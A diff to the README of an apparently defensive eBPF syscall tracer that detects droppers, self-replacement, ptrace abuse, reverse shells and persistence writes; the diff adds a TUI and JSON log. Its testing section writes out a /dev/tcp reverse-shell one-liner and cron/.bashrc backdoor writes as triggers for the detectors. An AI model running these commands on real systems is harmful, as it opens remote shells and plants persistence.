@@ -6,7 +6,7 @@ the kernel boundary.
 
 ## Status
 
-Core detection set complete. Five probes feed the ring buffer (`sys_enter_execve`,
+Core detection set and output layer complete. Five probes feed the ring buffer (`sys_enter_execve`,
 `sys_enter_openat` filtered to `O_CREAT`, both `sys_enter_unlinkat` and the
 legacy `sys_enter_unlink` — glibc's `unlink()` doesn't consistently route
 through `unlinkat()` the way `open()` routes through `openat()`, so both are
@@ -68,8 +68,10 @@ eBPF programs                 loader + reader (Rust, aya)
                                             detection rules
                                             (stateful, per-pid)
                                                  │
-                                                 ▼
-                                            TUI / JSON log
+                                    ┌────────────┴────────────┐
+                                    ▼                          ▼
+                              JSON-lines log            interactive TUI
+                              (syscall-tracer.jsonl)     (ratatui, live)
 ```
 
 - `syscall-tracer-ebpf` — the in-kernel programs. Kept tiny: read, filter,
@@ -80,7 +82,13 @@ eBPF programs                 loader + reader (Rust, aya)
 - `syscall-tracer` — loads the eBPF object, attaches programs, drains the
   ring buffer, and hosts the stateful detection layer (`src/detection/`, one
   module per rule), keyed by pid and tested independent of the kernel/eBPF
-  plumbing.
+  plumbing. Every decoded event and alert goes to both output sinks:
+  - `src/jsonlog.rs` — append-only JSON-lines log (`syscall-tracer.jsonl`),
+    flushed per line, for later review independent of the live view.
+  - `src/tui.rs` — a `ratatui` dashboard (status bar, alerts pane, live
+    event stream), fed over a channel from the async ring-buffer-draining
+    task. Runs on its own thread (`tokio::task::spawn_blocking`) since
+    crossterm's event polling is synchronous, not async.
 
 ## Build
 
@@ -116,52 +124,38 @@ back to the system toolchain — producing `can't find crate for core` when it
 tries to cross-compile the eBPF object. If you hit that error, it means
 `sudo` was applied one level too high.
 
-Trigger some execve calls in another shell and watch the event stream:
+`cargo run` launches straight into the TUI: a status bar (event/alert
+counts), an alerts pane, and a live-scrolling events pane. `q` or Ctrl-C
+quits and restores your terminal. Every event and alert is also appended to
+`syscall-tracer.jsonl` in the working directory as it happens, regardless of
+whether the TUI is open — so a second terminal running
+`tail -f syscall-tracer.jsonl | jq` (or a plain `grep`) works as a
+TUI-independent view, and the file itself is the "for later review" record.
+
+Trigger detections in another shell and watch the alerts pane light up:
+
+- **dropper**: `echo x > /tmp/payload && chmod +x /tmp/payload && /tmp/payload`
+  won't trigger it (bash forks a new pid for the final exec) — needs a
+  single process doing the write-then-exec itself, e.g. a small Python
+  `open(...); os.execv(...)`.
+- **self-replace**: a process that `os.unlink()`s the exact path it's
+  running as, then `os.execv()`s that same path again — same caveats as
+  above, plus avoid an `env`-based shebang (see the limitation above).
+- **cross-process ptrace**: `ptrace(PTRACE_SEIZE, <unrelated pid>, 0, 0)`
+  via `ctypes` against an unrelated sibling process (root, or Yama's
+  ptrace-scope will block it).
+- **reverse shell**: `bash -i >& /dev/tcp/host/port 0>&1` against a
+  listener you control.
+- **persistence write**: any creating write into a watched path, e.g.
+  `echo evil >> ~/.bashrc` or `echo "* * * * * evil" >> /etc/cron.d/backdoor`.
+
+A sample alert line, as it appears in both the TUI and the JSON log:
 
 ```
-KIND   PID      UID COMM             PATH
-WRITE  4213     1000 tee              /tmp/payload
-EXEC   4213     1000 tee              /tmp/payload
-[ALERT] dropper pattern: pid=4213 uid=1000 wrote then exec'd /tmp/payload (12ms later)
+[dropper] pid=4213 uid=1000 wrote then exec'd /tmp/payload (0ms later)
 ```
-
-Self-replace requires a process that unlinks the exact path it's currently
-running as, then re-execs that same path — not something an interactive
-shell reproduces naturally, since each external command is a fresh
-fork+exec. A single process doing it to itself (no fork) is the real shape
-(and, per the limitation above, avoid an `env`-based shebang for a script
-payload):
-
-```
-UNLINK 4310     1000 agent            /opt/agent
-EXEC   4310     1000 agent            /opt/agent
-[ALERT] self-replace: pid=4310 uid=1000 unlinked then re-exec'd /opt/agent (8ms later)
-```
-
-Cross-process ptrace needs a `PTRACE_ATTACH`/`PTRACE_SEIZE` where the tracer
-isn't the target's parent — e.g. attach to an unrelated already-running
-process (root or matching uid; the target must not already be traced):
-
-```
-PTRACE 5120     1000 python3          target_pid=4980
-[ALERT] cross-process ptrace: pid=5120 uid=1000 attached to unrelated pid 4980
-```
-
-Reverse-shell needs a shell exec'd with a socket already on stdin or stdout
-— redirect a shell onto a raw TCP connection (e.g. the classic
-`bash -i >& /dev/tcp/host/port 0>&1`, against a listener you control):
-
-```
-EXEC   5401     1000 bash             /bin/bash
-[ALERT] reverse shell: pid=5401 uid=1000 /bin/bash has a socket on stdin/stdout
-```
-
-Persistence writes just need a creating write into a watched path, e.g.
-`echo "* * * * * evil" >> /etc/cron.d/backdoor` or `echo evil >> ~/.bashrc`:
-
-```
-WRITE  5502     0    bash             /etc/cron.d/backdoor
-[ALERT] persistence write (cron): pid=5502 uid=0 wrote /etc/cron.d/backdoor
+```json
+{"type":"alert","ts":1767955123.456,"rule":"dropper","pid":4213,"uid":1000,"path":"/tmp/payload","detail":"wrote then exec'd within 0ms"}
 ```
 
 Run the unit tests for the detection logic (pure state-machine code, no
@@ -173,4 +167,6 @@ cargo test -p syscall-tracer
 
 ## Roadmap
 
-- Live terminal view plus a JSON event log for later review.
+The core detection set (5 rules) and the output layer (TUI + JSON log) from
+the original brief are both complete and verified live. Remaining: a short
+demo GIF for the portfolio write-up.
